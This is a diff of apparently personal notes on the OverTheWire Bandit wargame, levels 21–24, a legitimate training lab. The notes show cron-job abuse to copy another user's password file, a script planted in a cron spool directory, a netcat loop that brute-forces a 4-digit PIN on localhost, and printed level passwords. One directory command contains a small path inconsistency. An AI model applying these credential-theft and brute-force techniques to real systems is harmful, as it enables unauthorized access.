@@ -333,11 +333,13 @@ bandit21
 
 I need to look into the cron job and see what command is being executed.
 
+ls -l /etc/cron.d see what files there are
+
+so if i cat /usr/bin/cronjob_bandit22.sh I'll be able to see the script.
+
 * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
 
 every * equals a minute, the user bandit 22 runs command /usr/bin/cronjob_bandit22.sh &> /dev/null.
-
-so if i cat /usr/bin/cronjob_bandit22.sh I'll be able to see the script.
 
 #!/bin/bash
 chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
@@ -353,3 +355,72 @@ ________________________________________________________________
 
 bandit22
 
+same as bandit21 but the the script does something different
+
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+looks like it finds what user you are then copies that users password to tmp.
+
+Since its a cronjob I know its ran as the user bandit23.
+So, if I generate the bandit23 md5sum hash. I should be able to cat the hash in tmp.
+
+flag: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+________________________________________________________________
+
+bandit23
+
+This is one I need to write a script that will be activated every minute by the cronjob
+
+in the notes the script need to be created in /var/spool/bandit24/foo/
+
+I'll run a test script first
+
+create a space with the correct permission for my txt file to save.
+
+mkdir -p /print
+chmod 777 /tmp/print
+
+The script
+
+vim /var/spool/bandit24/foo/bandito.sh
+
+#!/bin/bash
+echo "hi" > /tmp/print/hi.txt
+
+set permissions
+
+chmod +x /var/spool/bandit24/foo/bandito.sh
+
+then i can run 
+
+cat /tmp/print/hi.txt
+
+now to apply the same logic and copy the bandit24 flag.
+
+here is the edited script
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/print/flag.txt
+
+flag: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+________________________________________________________________
+
+bandit24
+
+I need to brute force the pin code to gain access to bandit25 flag.
+
+script
+
+#!/bin/bash                                                                                                                                                                                                                                                                         bandit24_flag="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"                                                                                                                                                                                                                                    host="localhost"                                                                                                                          port="30002"                                                                                                                                                                                                                                                                        for pincode in {0000..9999}; do
+    echo "Trying pincode: $pincode..."
+    echo "$bandit24_flag $pincode" | nc $host $port
+done
